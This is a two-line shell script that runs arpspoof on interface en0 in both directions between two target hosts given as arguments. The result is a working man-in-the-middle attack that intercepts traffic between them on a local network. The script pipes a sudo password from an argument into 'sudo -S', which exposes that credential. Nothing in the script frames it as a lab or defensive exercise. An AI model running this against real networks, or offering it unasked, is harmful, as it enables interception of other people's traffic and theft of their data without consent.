echo $3 | sudo -S sudo arpspoof -i en0 -t $1 $2 &
echo $3 | sudo -S arpspoof -i en0 -t $2 $1




